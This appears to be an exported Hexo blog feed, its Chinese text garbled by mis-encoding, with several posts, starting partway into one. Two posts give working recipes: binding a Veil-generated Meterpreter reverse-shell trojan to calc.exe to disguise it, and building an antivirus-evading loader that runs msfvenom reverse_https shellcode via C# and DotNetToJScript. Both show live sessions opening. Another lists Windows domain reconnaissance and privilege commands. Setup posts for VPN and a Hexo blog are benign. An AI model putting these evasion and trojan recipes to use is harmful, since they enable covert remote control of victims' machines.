    <content type="text"><![CDATA[0x00 å‰è¨€æœ€è¿‘åœ¨å­¦ä¹  veil çš„ Veil-Evasion æ¨¡å—ï¼Œå‘çŽ°ä¸€æ¬¾èƒ½æ†ç»‘ä¸¤ä¸ª exe æ–‡ä»¶çš„ pyJoiner å·¥å…·ï¼Œä¾¿æ‹¿æ¥å­¦ä¹ å­¦ä¹ ã€‚ 0x01 åœ¨kali linux 2018.1 å®‰è£…ä½¿ç”¨ veil 3.1.1 åˆ¶ä½œå›žè¿žæœ¨é©¬ Veil-Evasion åˆ¶ä½œå›žè¿žæœ¨é©¬ 12345678910111213141516root@kali:~# veiluse 1 #é€‰æ‹©ä½¿ç”¨ Veil-Evasion æ¨¡å—Veil-Evasion Menu 41 payloads loadedAvailable Commands: back Go to main Veil menu checkvt Check virustotal against generated hashes clean Remove generated artifacts exit Exit Veil info Information on a specific payload list List available payloads use Use a specific payloadVeil-Evasion command: use 11 #é€‰æ‹©payload[cs/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.3.149[cs/meterpreter/rev_tcp&gt;&gt;] set LPORT 4444[cs/meterpreter/rev_tcp&gt;&gt;] generate ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¼€å¯ç›‘å¬ï¼š root@kali:~# msfconsole -r /var/lib/veil/output/handlers/test.rc 0x02 é…ç½® pyJoinerâ€”GUI-Version è¿è¡ŒçŽ¯å¢ƒGitHub ä¸Šæœ‰ä¸¤ä¸ªç‰ˆæœ¬ é¡¹ç›®åœ°å€ ï¼Œå…¶ä¸­ kali ç‰ˆå¿…é¡»ä½¿ç”¨ Kali Linux i386 ï¼Œæˆ‘çš„æ˜¯ x64 kali ï¼Œæ‰€ä»¥é€‰æ‹©äº† Windowsç‰ˆæœ¬çš„ pyJoinerâ€”GUI-Versionã€‚ æœ¬æ¬¡å®žéªŒ pyJoiner è¿è¡ŒçŽ¯å¢ƒå¦‚ä¸‹ï¼š Windows 10 Python 3.6.3 pyinstaller 3.3.1 0x03 å°†ä¸¤ä¸ªexeæ–‡ä»¶è¿›è¡Œæ†ç»‘è¿™é‡Œæ†ç»‘çš„æ˜¯ calc.exe è¿™ä¸ªç¨‹åºï¼Œå°†å›žè¿žæœ¨é©¬ test.exe ä¸Žå…¶è¿›è¡Œæ†ç»‘ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š py -3 pyJoiner.py #åœ¨ pyJoiner ç›®å½•ä¸‹è¿è¡Œ CMD æ‰§è¡Œå‘½ä»¤ï¼Œåˆ‡è®°ä¸è¦å…³é—­CMD æ‰“å¼€ GUI å¦‚ä¸‹å›¾ï¼š å®žéªŒä¸­ file1 é€‰æ‹©çš„ calc.exe ï¼Œfile2 é€‰æ‹©çš„å›žè¿žæœ¨é©¬test.exeï¼Œ é€‰æ‹©å¥½ä¹‹åŽç‚¹å‡» Join ã€‚ æ†ç»‘åŽç”Ÿæˆçš„ exe è·¯å¾„å¦‚ä¸‹ï¼š 0x04 å…æ€å›žè¿žæµ‹è¯•ä½¿ç”¨åœ¨çº¿æŸ¥æ€å¼•æ“Ž virustotal çš„ç»“æžœå¦‚ä¸‹ï¼š å›žè¿žæµ‹è¯•ï¼š ç›®æ ‡æœº Windows 10 åœ¨ç›®æ ‡æœºåŒå‡»æ†ç»‘åŽçš„æ–‡ä»¶ï¼Œæ‰“å¼€äº†æ†ç»‘çš„ file1 åº”ç”¨ç¨‹åºè®¡ç®—å™¨ kali å›žè¿ž Meteoreter session 12msf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 192.168.3.138[*] Meterpreter session 1 opened (192.168.3.149:4444 -&gt; 192.168.3.138:38099) at 2018-03-06 07:22:08 -0500 å‚è€ƒèµ„æ–™https://www.youtube.com/watch?v=vHz8QU2Dj9M https://github.com/danielhnmoreno/pyJoiner---GUI-Version]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
        <category>å…æ€</category>
      </categories>
      <tags>
        <tag>å…æ€</tag>
        <tag>payloads</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kaliå®‰è£…pptpå’Œshadowsockså®¢æˆ·ç«¯]]></title>
    <url>%2F2018%2F03%2F06%2Fkali%E5%AE%89%E8%A3%85pptp%2Bshadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF.html</url>
    <content type="text"><![CDATA[kali å®‰è£… pptp æ–¹æ³•ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ 123456apt-get install network-manager-openvpn-gnome &amp;&amp; apt-get install network-manager-pptp &amp;&amp; apt-get install network-manager-pptp-gnome &amp;&amp; apt-get install network-manager-strongswan &amp;&amp; apt-get install network-manager-vpnc &amp;&amp; apt-get install network-manager-vpnc-gnome#ä»¥ä¸Šä¸ºä¸€æ¡å‘½ä»¤æ¥æ‰§è¡Œcp /etc/network/interfaces /etc/network/interfaces.backup echo &quot;auto lo &quot; &gt; /etc/network/interfaces echo &quot;iface lo inet loopback&quot; &gt;&gt; /etc/network/interfaces /etc/init.d/network-manager restart kaliå®‰è£…sså®¢æˆ·ç«¯Command-line Client1234pip install shadowsocksapt-get install shadowsocks-libevcpan Net::Shadowsockssslocal -s 23.154.235.12 -p 8388 -l 1080 -k password -t 600 -m aes-256-cfb æ³¨é‡Šï¼š-s æœåŠ¡å™¨IPï¼Œ-pä¸ºssé…ç½®çš„ç«¯å£ï¼Œ-l æœ¬åœ°ä»£ç†ç«¯å£ï¼Œ-kä¸ºssé…ç½®çš„å¯†ç ]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>pptp</tag>
        <tag>ss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å…æ€ MSF Windows Payload çš„æ–¹æ³•ä¸Žå®žè·µï¼ˆå°ç™½è§†è§’ï¼‰]]></title>
    <url>%2F2017%2F12%2F22%2F%E5%85%8D%E6%9D%80%20MSF%20Windows%20Payload%20%E7%9A%84%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E8%B7%B5.html</url>
    <content type="text"><![CDATA[MSF æ˜¯å½“ä¸‹æœ€æµè¡Œçš„æ¸—é€æµ‹è¯•å¹³å°ï¼Œåœ¨è¿›è¡ŒåŽæ¸—é€é˜¶æ®µå¾€å¾€éœ€è¦æˆ‘ä»¬ç»•è¿‡æ€è½¯ç­‰éšè”½æ“ä½œï¼Œåœ¨çœ‹å®Œä½™å¼¦çŒ¥çæµæ‰“å‘ä¹‹åŽï¼Œè‡ªä¸ªæ‰‹åŠ¨å®žè·µï¼Œç„¶åŽå†™ä¸€ä¸ªè¯¦ç»†çš„æ¼”ç»ƒæ“ä½œï¼Œåšç¬”è®°å­˜æ¡£ã€‚ 0x00 åˆ¶ä½œpayloadä½¿ç”¨ kali é‡Œçš„ msfvenom ç”Ÿæˆä¸€ä¸ªx86çš„ Meterpreter Payload å‘½ä»¤å¦‚ä¸‹ï¼š 1root@kali:~# msfvenom -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b "\x00\xff" LHOST=192.168.1.99 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe å¤§éƒ¨åˆ†å‚æ•°éƒ½ä¸ç”¨è¿‡å¤šè§£é‡Šäº†ï¼Œå¸¸ç”¨ MSF çš„äººéƒ½çŸ¥é“ã€‚éœ€è¦è¯´æ˜Žçš„æ˜¯ï¼Œæˆ‘ä»¬è¦å€ŸåŠ©äºŽ C# æ¥æ‰§è¡Œç”Ÿæˆçš„ Payloadï¼Œæ‰€ä»¥æ ¼å¼è¦é€‰æ‹©ä¸º csharpï¼Œè€Œæœ€åŽä¸¤ä¸ªå‚æ•°ï¼ˆPrependMigrate å’Œ PrependMigrateProcï¼‰æ˜¯æŒ‡æ˜Ž Payload æ‰§è¡ŒåŽè¦å°†è‡ªå·±æ³¨å…¥åˆ°ä¸€ä¸ªæ–°åˆ›å»ºçš„å®¿ä¸» svchost.exe è¿›ç¨‹ä¸­åŽ»ã€‚ ç”Ÿæˆç»“æžœ cat https.csharp å¦‚å›¾æ‰€ç¤ºï¼Œ 0x01 åˆ›å»º c# é¡¹ç›®æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª C# é¡¹ç›®ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯ Visual Studio 2017ã€‚æ–°å»ºä¸€ä¸ªç©ºç™½çš„ C# çš„æŽ§åˆ¶å°åº”ç”¨(.NET Framework)å·¥ç¨‹ï¼Œ.Net Framework ç‰ˆæœ¬é€‰æ‹© 2.0ï¼ˆä¿è¯å…¼å®¹æ€§ï¼‰ã€‚ å°†ä¸‹åˆ—ä»£ç ç²˜è´´è¦†ç›–åˆ° Program.cs ä¸­ï¼š 123456789101112131415161718192021222324252627282930using System;using System.Threading;using System.Runtime.InteropServices;namespace MSFWrapper&#123; public class Program &#123; public Program() &#123; RunMSF(); &#125; public static void RunMSF() &#123; byte[] MsfPayload = &#123; //Paste your Payload here &#125;; IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40); Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length); CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0); Thread.Sleep(2000); &#125; public static void Main() &#123; &#125; [DllImport(&quot;kernel32.dll&quot;)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(&quot;kernel32.dll&quot;)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); &#125;&#125; ç„¶åŽå°†åœ¨ kali ç”Ÿæˆçš„ payload ä¸­çš„åå…­è¿›åˆ¶æ•°æ•°ç»„ç²˜è´´åˆ°ä»£ç ä¸­æ³¨é‡Šä¸ºâ€œ//Paste your Payload hereâ€çš„ä¸‹é¢ã€‚ ä¿å­˜ä»£ç åŽï¼Œä¿®æ”¹è¯¥å·¥ç¨‹çš„å±žæ€§ï¼Œå°†è¾“å‡ºç±»åž‹æ”¹ä¸ºâ€œWindows åº”ç”¨ç¨‹åºâ€ï¼Œå¯åŠ¨å¯¹è±¡æ”¹ä¸ºâ€œMSFWrapper.Programâ€å¹¶ä¿å­˜ï¼Œå¦‚å›¾ï¼š å¢žåŠ  Release ç‰ˆçš„ x86 ç¼–è¯‘å¯¹è±¡ï¼Œå¦‚å›¾ï¼š ç„¶åŽç”Ÿæˆå‡º MSFWrapper.exe ï¼š 0x02 å°†ç”Ÿæˆçš„ exe æ–‡ä»¶è½¬æ¢æˆ js æ–‡ä»¶DotNetToJScriptæºç ä¸‹è½½ å¼€æºå·¥å…·DotNetToJScriptè¯¦ç»†ç¼–è¯‘æ•™ç¨‹ è½¬æ¢å‘½ä»¤ï¼š F:\WEBæ¸—é€å·¥å…·&gt;DotNetToJScript.exe -l=JScript -o=MSFWrapper.js -c=MSFWrapper.Program MSFWrapper.exe 0x03 é€šè¿‡å‘½ä»¤æ‰§è¡Œ js æ–‡ä»¶ä½¿å…¶å¼¹å›ž Meterpreter shellåœ¨ kali é‡Œæ‰§è¡Œå‘½ä»¤è¿›è¡Œç›‘å¬ï¼š 123456root@kali:~# msfconsole msf &gt; use exploit/multi/handler msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_httpsmsf exploit(multi/handler) &gt; set lhost 192.168.1.99msf exploit(multi/handler) &gt; set lport 443msf exploit(multi/handler) &gt; run åœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š C:\windows\SysWOW64\cscript.exe /e:JScript MSFWrapper.js kali åå¼¹å›ž meterpreter ï¼š 12[*] Started HTTPS reverse handler on https://192.168.1.99:443[*] https://192.168.1.99:443 handling request from 192.168.1.84; (UUID: flnzcixx) Staging x86 payload (180825 bytes) ... è¿™é‡Œä¸€å®šè¦æ³¨æ„ï¼Œå› ä¸ºæˆ‘ä»¬ç”Ÿæˆçš„ Payload è·Ÿ exe éƒ½æ˜¯ 32 ä½çš„ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿè¦ç”¨ 32 çš„ cscript.exe åŽ»æ‰§è¡Œã€‚åˆ‡è®°ï¼ 0x04 ENDæœªå®Œå¾…ç»­ ingâ€¦â€¦]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
        <category>å…æ€</category>
      </categories>
      <tags>
        <tag>å…æ€</tag>
        <tag>payloads</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¼€æºå·¥å…·DotNetToJScriptè¯¦ç»†ç¼–è¯‘æ•™ç¨‹]]></title>
    <url>%2F2017%2F12%2F18%2F%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7%20DotNetToJScript.html</url>
    <content type="text"><![CDATA[0x00 ä»‹ç»James Forshawå¼€æºäº†ä¸€ä¸ªå·¥å…·DotNetToJScriptï¼Œèƒ½å¤Ÿåˆ©ç”¨JS/Vbsè„šæœ¬åŠ è½½.Netç¨‹åºï¼Œè¿™æ˜¯ä¸€æ¬¾å¯ä»¥å°† .net ç¨‹åºè½¬æ¢ä¸º jscript ä»£ç çš„å·¥å…·ã€‚ å·¥å…·ä¸‹è½½ï¼šä¸‹è½½åœ°å€ 0x01 ç”¨åˆ°å·¥å…·ç”±äºŽæ­¤ä¸ºå¼€æºä»£ç éœ€è¦è‡ªå·±ç¼–è¯‘ï¼Œé€šè¿‡è‡ªå·±çš„ç ”ç©¶ç»ˆäºŽç¼–è¯‘æˆåŠŸã€‚ ä½¿ç”¨å·¥å…·vs2017ï¼› ndesk-options-0.2.1.bin æ–‡ä»¶çš„å¼•ç”¨ã€‚ 0x02 ç¼–è¯‘è¿‡ç¨‹ æ‰“å¼€vs2017ï¼Œç‚¹å‡»æ‰“å¼€é¡¹ç›®/è§£å†³æ–¹æ¡ˆï¼› æ‰“å¼€DotNetToJScriptç›®å½•ä¸‹çš„DotNetToJScript.csproj Visual C# é¡¹ç›®æ–‡ä»¶ï¼› ç‚¹å‡»Program.csç”Ÿæˆè§£å†³æ–¹æ¡ˆï¼› æŠ¥é”™ç¼ºå°‘ç¨‹åºé›†å¼•ç”¨ NDesk.Optionsï¼› è§£å†³åŠžæ³• éœ€è¦æ·»åŠ å¼•ç”¨ NDesk.Options ä¸‹è½½åœ°å€ï¼š ç‚¹å‡»ä¸‹è½½ è§£åŽ‹ç¼©ï¼ŒæŒ‰å›¾æ·»åŠ å¼•ç”¨ï¼› â€‹ æµè§ˆâ€”-é€‰æ‹©å›¾ä¸­æ–‡ä»¶â€”-æ·»åŠ ï¼› ç„¶åŽé‡æ–°ç”Ÿæˆè§£å†³æ–¹æ¡ˆå³å¯ï¼› â€‹ â€‹ â€‹]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
        <category>å…æ€</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo + Next æ­å»ºGitHub page]]></title>
    <url>%2F2017%2F12%2F13%2FHexo%2Bnext.html</url>
    <content type="text"><![CDATA[0x00 å‡†å¤‡å·¥ä½œ ä¸‹è½½node.jså¹¶å®‰è£… å®˜ç½‘ä¸‹è½½å®‰è£…é»˜è®¤ä¼šå®‰è£…npmï¼› ä¸‹è½½å®‰è£…git å®˜ç½‘ä¸‹è½½å®‰è£…ï¼› å®‰è£…hexoï¼Œæ–¹æ³•ï¼šç®¡ç†å‘˜æ‰“å¼€cmdï¼š$ npm install -g hexo-cliã€‚ 0x01 æœ¬åœ°ç”Ÿæˆhexoæ–‡ä»¶ åœ¨æœ¬åœ°æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ e.g. D:/Hexo ï¼› åœ¨D:/Hexoç›®å½•ä¸‹é¼ æ ‡å³é”®â€Git Bash Hereâ€ï¼Œè¾“å…¥ï¼šhexo init; è¾“å…¥ï¼šhexo g ç”Ÿæˆé™æ€ç½‘é¡µï¼Œhexo s å¯åŠ¨æœ¬åœ°æœåŠ¡é¢„è§ˆï¼› å®ŒæˆåŽHexoæ–‡ä»¶å¤¹ä¼šç”Ÿæˆä»¥ä¸‹å†…å®¹ï¼š 12345678.â”œâ”€â”€ _config.ymlâ”œâ”€â”€ package.jsonâ”œâ”€â”€ scaffoldsâ”œâ”€â”€ source| â”œâ”€â”€ _drafts| â””â”€â”€ _postsâ””â”€â”€ themes æ‰“å¼€æœ¬åœ°æµè§ˆå™¨ è¾“å…¥ï¼šhttp://localhost:4000 è¿›è¡Œè®¿é—®ã€‚ 0x02 å°†æœ¬åœ°hexoæŽ¨é€åˆ°GitHub åœ¨GitHubä¸Šåˆ›å»ºåå­—ä¸º zhangsan.github.io çš„é¡¹ç›®zhangsanæ˜¯è‡ªå·±çš„githubç”¨æˆ·åï¼› æ‰“å¼€ D:/Hexo/_config.yml é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹ä»¥ä¸‹å†…å®¹ä¸º http://zhangsan.github.io ï¼š 123# URL## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;url: http://zhangsan.github.io æ‰“å¼€ D:/Hexo/_configé…ç½®æ–‡ä»¶ï¼Œåœ¨æ–‡æœ«çš„deployåšä»¥ä¸‹è®¾ç½®ï¼š 1234deploy: type: git repository: https://github.com/zhangsan/zhangsan.github.io.git branch: master æ‰§è¡Œï¼šnpm install hexo-deployer-git â€“save ï¼ˆæ­¤å‘½ä»¤æœ€å¥½åœ¨ç®¡ç†å‘˜æƒé™çš„cmdä¸‹æ‰§è¡Œï¼‰ï¼› æ‰§è¡Œï¼šhexo clear (ä¸€èˆ¬æƒ…å†µä¸‹ä¸ç”¨æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œå½“ç½‘ç«™é”™è¯¯æ‰“ä¸å¼€çš„æ—¶å€™å†æ‰§è¡Œå®ƒï¼)ï¼› æ‰§è¡Œï¼šhexo g ï¼ˆæœ¬åœ°ç”Ÿæˆé™æ€æ–‡ä»¶ï¼‰ï¼› æ‰§è¡Œï¼šhexo d ï¼ˆå°†æœ¬åœ°é™æ€æ–‡ä»¶æŽ¨é€è‡³Github)ï¼› æœŸé—´ä¼šå¼¹å‡ºgithubç™»å½•æ¡†æŒ‰æç¤ºç™»å½•å³å¯ï¼Œç™»å½•æˆåŠŸä¸€æ¬¡å¾€åŽä¸ç”¨é‡å¤ç™»å½•ï¼› é€šè¿‡http://zhangsan.github.ioå³å¯è®¿é—®ã€‚ 0x03 ç»‘å®šè‡ªå·±çš„åŸŸå åŸŸåæœåŠ¡å•†-æŽ§åˆ¶é¢æ¿-DNSè§£æžâ€”æ·»åŠ CNAMEè®°å½•ï¼š@ &gt;&gt;&gt; zhangsan.github.ioORwww &gt;&gt;&gt; zhangsan.github.io åœ¨Hexo/sorceæ–°å»ºCNAMEæ–‡ä»¶å†™å…¥åŸŸåï¼ŒCNAMEæ–‡ä»¶ï¼Œæ³¨æ„æ²¡æœ‰æ–‡ä»¶åŽç¼€ï¼› æ‰§è¡Œï¼šhexo g æ‰§è¡Œï¼šhexo sï¼ˆæœ¬åœ°é¢„è§ˆï¼Œå¯ä»¥è·³è¿‡ï¼‰ æ‰§è¡Œï¼šhexo d 0x04 ä½¿ç”¨nextä¸»é¢˜å¹¶ç»™ç½‘ç«™æ·»åŠ æµè§ˆå™¨logo ä¸»é¢˜ä¸‹è½½ï¼Œnextåœ¨githubä¸‹è½½ï¼Œå¹¶æŠŠnextæ–‡ä»¶å¤¹æ”¾åˆ°temesæ–‡ä»¶å¤¹ï¼› ä½¿ç”¨nextä¸»é¢˜ï¼Œç¼–è¾‘Hexo/_config.ymlä»¥ä¸‹å†…å®¹ï¼š##Themes: https://hexo.io/themes/theme: next å°†å°ºå¯¸ä¸º32x32 favicon.ico æ–‡ä»¶æ”¾åœ¨hexo/source/æ–‡ä»¶å¤¹å†…ï¼Œç„¶åŽä¿®æ”¹Hexo\themes\next\_config.ymlä¸ºï¼š 12# Put your favicon.ico into `hexo-site/source/` directory.favicon: /favicon.ico ç¼–è¾‘Hexo/_config.ymlä»¥ä¸‹å†…å®¹ï¼š 12# Place your favicon.ico to /source directory.favicon: /favicon.ico 0x05 å°†ç½‘ç«™æ˜¾ç¤ºä¸ºä¸­æ–‡ ç¼–è¾‘D:/Hexo/_config.ymlé…ç½®æ–‡ä»¶ï¼š 12language: zh-Hans #å°†é»˜è®¤æ”¹æˆzh-Hanstimezone: åœ¨Hexo/next/lanhuagesç›®å½•ä¸‹çš„zh-Hans.ymlæ–‡ä»¶å¯ä»¥è‡ªè¡Œä¿®æ”¹ï¼Œå¢žåŠ å’Œåˆ é™¤ã€‚ 0x06 æ·»åŠ èœå•å’Œè‡ªå®šä¹‰èœå•å‰çš„å›¾æ ‡ ç¼–è¾‘themes\next\_config.ymlï¼Œåˆ°menu:å­—æ®µï¼Œåœ¨è¯¥å­—æ®µä¸‹æ·»åŠ ä¸€ä¸ªå­—æ®µï¼› 1234menu: home: / about: /about ...... è‡ªå®šä¹‰å°å›¾æ ‡ï¼Œå…³äºŽnextä½¿ç”¨çš„å°å›¾æ ‡ä½ å¯ä»¥é€šè¿‡è¿™ä¸ªç½‘ç«™Font Awesomeæ¥æŸ¥çœ‹è‡ªå·±å–œæ¬¢çš„å›¾æ ‡ï¼Œç„¶åŽcopyå›¾æ ‡åï¼Œç¼–è¾‘Hexo\themes\next\_config.ymlï¼Œå°†å¯¹åº”çš„å›¾æ ‡åæ¢æˆè‡ªå·±å–œæ¬¢çš„å°å›¾æ ‡ï¼› 1234567891011menu_icons: enable: true #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome home: home about: mortar-board categories: smile-o schedule: calendar tags: diamond archives: angellist sitemap: sitemap commonweal: heartbeat 0x07 éšè—ç½‘é¡µåº•éƒ¨powered By Hexo / å¼ºåŠ›é©±åŠ¨ æ‰“å¼€themes/next/layout/_partials/footer.swig,ä½¿ç”¨â€â€éšè—ä¹‹é—´çš„ä»£ç å³å¯ï¼Œæˆ–è€…ç›´æŽ¥åˆ é™¤ã€‚12345678910&lt;!--&lt;div class=&quot;powered-by&quot;&gt; &#123;&#123; __(&apos;footer.powered&apos;, &apos;&lt;a class=&quot;theme-link&quot; rel=&quot;external nofollow&quot; href=&quot;https://hexo.io&quot;&gt;Hexo&lt;/a&gt;&apos;) &#125;&#125;&lt;/div&gt;&lt;div class=&quot;theme-info&quot;&gt; &#123;&#123; __(&apos;footer.theme&apos;) &#125;&#125; - &lt;a class=&quot;theme-link&quot; rel=&quot;external nofollow&quot; href=&quot;https://github.com/iissnan/hexo-theme-next&quot;&gt; NexT.&#123;&#123; theme.scheme &#125;&#125; &lt;/a&gt;&lt;/div&gt; 0x08 å¢žåŠ æœ¬åœ°æœç´¢åŠŸèƒ½å®‰è£… hexo-generator-searchdbï¼Œåœ¨ç«™ç‚¹çš„æ ¹ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š$ npm install hexo-generator-searchdb --saveå¦‚æžœæŠ¥é”™å¤šæ‰§è¡Œå‡ æ¬¡ï¼Œæœ‰çš„æ—¶å€™æ˜¯ç½‘ç»œåŽŸå› ï¼Œæœ€å¥½åœ¨ç®¡ç†å‘˜æƒé™ä¸‹çš„cmdé‡Œæ‰§è¡Œnpmå®‰è£…å‘½ä»¤ã€‚ç¼–è¾‘Hexo/_config.ymlï¼Œæ–°å¢žä»¥ä¸‹å†…å®¹ï¼š12345search: path: search.xml field: post format: html limit: 10000 0x09 ä½¿ç”¨æ¥å¿…åŠ›è¯„è®ºåŠŸèƒ½ åˆ°livereæ³¨å†Œè´¦å·ï¼Œå®‰è£…æ¥å¿…åŠ›ï¼Œè®°å½•ä»¥ä¸‹å†…å®¹ï¼š åœ¨next/_config.ymlçš„æ­¤å¤„åŠ ä¸Šè‡ªå·±çš„livereçš„uidï¼šlivere_uid: your uid ç„¶åŽåŽ»åšå®¢æŸ¥çœ‹å§æ–‡ç« ä¸‹é¢ä¼šçœ‹åˆ°ä»¥ä¸‹æ™¯è±¡ï¼š 0x10 å‚è€ƒæ–‡ç« (https://thief.one/2017/03/03/Hexoæ­å»ºåšå®¢æ•™ç¨‹/)]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows å†…ç½‘å‘½ä»¤æ”¶é›†]]></title>
    <url>%2F2017%2F12%2F09%2FWindows%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4.html</url>
    <content type="text"><![CDATA[Windows å†…ç½‘å‘½ä»¤å¸¸è§ä¿¡æ¯æ”¶é›†å‘½ä»¤ 123456789101112net user æœ¬æœºç”¨æˆ·åˆ—è¡¨ net localgroup administrators æœ¬æœºç®¡ç†å‘˜[é€šå¸¸å«æœ‰åŸŸç”¨æˆ·] net user /domain æŸ¥è¯¢åŸŸç”¨æˆ· net group /domain æŸ¥è¯¢åŸŸé‡Œé¢çš„å·¥ä½œç»„ net group &quot;domain admins&quot; /domain æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„ net localgroup administrators /domain ç™»å½•æœ¬æœºçš„åŸŸç®¡ç†å‘˜ net localgroup administrators workgroup\user001 /add åŸŸç”¨æˆ·æ·»åŠ åˆ°æœ¬æœº net group &quot;Domain controllers&quot; æŸ¥çœ‹åŸŸæŽ§åˆ¶å™¨(å¦‚æžœæœ‰å¤šå°) ipconfig /all æŸ¥è¯¢æœ¬æœºIPæ®µï¼Œæ‰€åœ¨åŸŸç­‰ net view æŸ¥è¯¢åŒä¸€åŸŸå†…æœºå™¨åˆ—è¡¨ net view /domain æŸ¥è¯¢åŸŸåˆ—è¡¨ net view /domain:domainname æŸ¥çœ‹workgroupåŸŸä¸­è®¡ç®—æœºåˆ—è¡¨ å†…ç½‘(åŸŸ)æ¸—é€â€“åŸºæœ¬å‘½ä»¤123456789101112131415161718192021222324ipconfig /all æŸ¥è¯¢æœ¬æœºIPæ®µï¼Œæ‰€åœ¨åŸŸç­‰ net user æœ¬æœºç”¨æˆ·åˆ—è¡¨ net localgroup administrators æœ¬æœºç®¡ç†å‘˜[é€šå¸¸å«æœ‰åŸŸç”¨æˆ·] net user /domain æŸ¥è¯¢åŸŸç”¨æˆ· net group /domain æŸ¥è¯¢åŸŸé‡Œé¢çš„å·¥ä½œç»„ net group &quot;domain admins&quot; /domain æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„ net localgroup administrators /domain ç™»å½•æœ¬æœºçš„åŸŸç®¡ç†å‘˜ net localgroup administrators workgroup\user001 /add åŸŸç”¨æˆ·æ·»åŠ åˆ°æœ¬æœº net group &quot;domain controllers&quot; /domain æŸ¥çœ‹åŸŸæŽ§åˆ¶å™¨(å¦‚æžœæœ‰å¤šå°) net time /domain åˆ¤æ–­ä¸»åŸŸï¼Œä¸»åŸŸæœåŠ¡å™¨éƒ½åšæ—¶é—´æœåŠ¡å™¨ net config workstation å½“å‰ç™»å½•åŸŸ net session æŸ¥çœ‹å½“å‰ä¼šè¯ net use \\ip\ipc$ pawword /user:username å»ºç«‹IPCä¼šè¯[ç©ºè¿žæŽ¥Â­***] net share æŸ¥çœ‹SMBæŒ‡å‘çš„è·¯å¾„[å³å…±äº«] net view æŸ¥è¯¢åŒä¸€åŸŸå†…æœºå™¨åˆ—è¡¨ net view \\ip æŸ¥è¯¢æŸIPå…±äº« net view /domain æŸ¥è¯¢åŸŸåˆ—è¡¨ net view /domain:domainname æŸ¥çœ‹workgroupåŸŸä¸­è®¡ç®—æœºåˆ—è¡¨ net start æŸ¥çœ‹å½“å‰è¿è¡Œçš„æœåŠ¡ net accounts æŸ¥çœ‹æœ¬åœ°å¯†ç ç­–ç•¥ net accounts /domain æŸ¥çœ‹åŸŸå¯†ç ç­–ç•¥nbtstat â€“A ip netbios æŸ¥è¯¢ netstat â€“an/ano/anb ç½‘ç»œè¿žæŽ¥æŸ¥è¯¢ route print è·¯ç”±è¡¨ End]]></content>
      <categories>
        <category>å†…ç½‘</category>
      </categories>
      <tags>
        <tag>å†…ç½‘</tag>
        <tag>åŸŸæ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è®ºè¯­ååˆ™]]></title>
    <url>%2F2017%2F12%2F07%2Findex.html</url>
